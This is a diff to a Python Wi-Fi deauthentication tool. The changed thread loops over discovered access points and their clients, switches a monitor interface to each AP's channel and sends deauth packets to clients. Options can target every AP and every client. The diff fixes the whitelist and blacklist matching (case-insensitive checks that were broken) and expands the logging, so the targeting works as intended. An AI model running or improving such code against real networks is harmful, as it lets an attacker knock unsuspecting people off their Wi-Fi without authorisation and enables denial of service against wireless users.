@@ -166,36 +166,30 @@ def scanning_task() -> None:
 
 
 def attacking_task() -> None:
-    log_counter = 0
     """Attacking task to be run by thread 2"""
     while True:
-        # Log only once in 1000 iterations
-        # if log_counter == 0:
-        logger.debug(f"TARGETS: {list(targets_dict.items())}")
-            # log_counter += 1
-        # elif log_counter == 10:
-            # log_counter = 0
-
         for bssid, (ssid, clients, channel) in list(targets_dict.items()):
-            # logger.debug(f"Checking AP SSID:{ssid} BSSID:{bssid}")
+            logger.debug(f"Checking AP SSID:{ssid} BSSID:{bssid} on channel {channel} with clients {clients}")
             # Skip if there is no clients on AP
             if not clients: 
                 # logger.debug(f"No clients on AP SSID:{ssid} BSSID:{bssid}")
                 continue
             # Skip if AP is whitelisted
-            if bssid.lower in args.whitelist_ap or ssid.lower in args.whitelist_ap:
+            if bssid.lower()in args.whitelist_ap or ssid.lower()in args.whitelist_ap:
                 logger.info(f"AP SSID:{ssid} BSSID:{bssid} is in whitelist")
                 continue
-            if args.attack_all_ap or bssid.lower in args.blacklist_ap or ssid.lower in args.blacklist_ap:
-                logger.warning(f"Attacking clients on BSSID {bssid} (SSID: {ssid}) on channel {channel}")
+            # Attack if attack_all_ap or blacklisted
+            if args.attack_all_ap or bssid.lower()in args.blacklist_ap or ssid.lower()in args.blacklist_ap:
+                logger.warning(f"Attacking clients on BSSID:{bssid} SSID:{ssid} on channel:{channel}")
                 set_channel(INTERFACE_MONITOR_2, channel)
                 for client in clients:
                     # Skip if Client is whitelisted
-                    if client in args.whitelist_client:
+                    if client.lower()in args.whitelist_client:
                         logger.info(f"Client:{client} is in whitelist")
                         continue
-                    if args.attack_all_client or client in args.blacklist_client:
-                        logger.warning(f"Deauthing client {client} from BSSID {bssid}")
+                    # Attack if attack_all_client or blacklisted
+                    if args.attack_all_client or client.lower()in args.blacklist_client:
+                        logger.warning(f"Deauthing client:{client} from BSSID:{bssid} SSID:{ssid} channel:{channel}")
                         send_deauth_packets(INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.deauth_reasons, seq=args.deauth_seq)
 
 
